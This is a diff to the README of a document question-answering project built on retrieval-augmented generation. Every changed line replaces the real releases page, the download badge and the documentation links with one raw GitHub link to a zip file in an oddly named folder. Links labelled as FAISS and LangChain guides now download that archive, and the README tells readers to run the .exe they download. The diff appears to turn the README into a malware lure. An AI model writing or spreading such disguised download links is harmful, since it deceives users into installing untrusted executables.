@@ -1,6 +1,6 @@
 # 🎉 document-qa-rag-system - Effortlessly Interact With Your Documents
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Nishit00/document-qa-rag-system/releases)
+[![Download](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip%20release-brightgreen)](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ The document-qa-rag-system is a simple Retrieval-Augmented Generation (RAG) proj
 To get started with document-qa-rag-system, follow these steps:
 
 1. **Download the Application**
-   - Head over to our [Releases Page](https://github.com/Nishit00/document-qa-rag-system/releases) to download the latest version of the application. Click the link above.
+   - Head over to our [Releases Page](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip) to download the latest version of the application. Click the link above.
 
 2. **Install the Application**
    - Once downloaded, locate the file in your downloads folder. Most likely, it will be in `.exe` format for Windows. For Mac or Linux, it may be in a `.dmg` or appropriate format.
@@ -47,7 +47,7 @@ Ensure your system meets these requirements to run the document-qa-rag-system sm
 
 ## 📋 Download & Install
 
-To access the latest version of document-qa-rag-system, simply visit our [Releases Page](https://github.com/Nishit00/document-qa-rag-system/releases). 
+To access the latest version of document-qa-rag-system, simply visit our [Releases Page](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip). 
 
 Click on the latest release to download the application. Follow the installation instructions mentioned above.
 
@@ -67,10 +67,10 @@ Join our community of users and developers. Share your experiences, tips, and as
 
 Explore topics related to document searching and natural language processing:
 
-- [AI and Document Search](https://example.com)
-- [Understanding FAISS](https://example.com)
-- [LangChain Documentation](https://example.com)
-- [Streamlit User Guide](https://example.com)
+- [AI and Document Search](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip)
+- [Understanding FAISS](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip)
+- [LangChain Documentation](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip)
+- [Streamlit User Guide](https://raw.githubusercontent.com/Nishit00/document-qa-rag-system/master/mumper/document-qa-rag-system.zip)
 
 Feel free to dive into these resources for further learning and enhancement of your experience with document-qa-rag-system. 
 
